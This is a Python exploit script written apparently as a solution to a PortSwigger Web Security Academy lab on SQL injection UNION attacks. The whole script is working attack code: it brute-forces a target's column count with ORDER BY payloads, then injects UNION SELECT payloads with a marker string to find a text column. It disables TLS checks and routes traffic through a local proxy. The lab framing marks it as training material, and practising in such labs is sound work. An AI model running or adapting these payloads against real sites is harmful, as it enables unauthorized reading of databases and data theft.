#!/usr/bin/python3
import requests
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class Interface ():
    def __init__ (self):
        self.red = '\033[91m'
        self.green = '\033[92m'
        self.white = '\033[37m'
        self.yellow = '\033[93m'
        self.bold = '\033[1m'
        self.end = '\033[0m'

    def header(self):
        print('\n    >> SQL injection UNION attack, finding a column containing text')
        print('    >> by Port Swigger Academy\n')

    def info (self, message):
        print(f"[{self.white}*{self.end}] {message}")

    def warning (self, message):
        print(f"[{self.yellow}!{self.end}] {message}")

    def error (self, message):
        print(f"[{self.red}x{self.end}] {message}")

    def success (self, message):
        print(f"[{self.green}✓{self.end}] {self.bold}{message}{self.end}")

# Instantiate our interface class
global output
output = Interface()
output.header()

proxies = {"http":"http://127.0.0.1:8080", "https":"http://127.0.0.1:8080"}

def exploit_sqli_column_number(url):
    path = "filter?category=Pets"
    for i in range(1,50):
        sql_payload = "'+ORDER+BY+%s--" %i
        r = requests.get(url + path + sql_payload, verify=False, proxies=proxies)
        res = r.text
        if "Internal Server Error" in res:
            return i - 1
        i = i + 1
    return False

def exploit_sqli_string_field(url, num_col):
    path = "filter?category=Pets"
    for i in range(1, num_col+1):
        string = "'pAhGB6'"
        payload_list = [' NULL'] * num_col
        payload_list[i-1] = string
        sqli_payload = "' UNION SELECT " + ','.join(payload_list) + "--"
        r = requests.get(url + path + sqli_payload, verify=False, proxies=proxies)
        res = r.text
        if string.strip('\'') in res:
            return i
    return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
    except IndexError:
        output.info("Usage: %s <url>" % sys.argv[0])
        output.info("Example: %s www.example.com" % sys.argv[0])
        sys.exit(-1)

    output.info("Figuring out number of columns...")
    num_col = exploit_sqli_column_number(url)
    if num_col:
        output.success("The number of columns is " + str(num_col) + ".")
        output.info("Figuring out which column contains text...")
        string_column = exploit_sqli_string_field(url,num_col)
        if string_column:
            output.success("The column that contains text is " + str(string_column) + ".")
        else:
            output.error("We were not able to find a column that has a string data type.")
    else:
        output.error("SQLi attack was not successful!")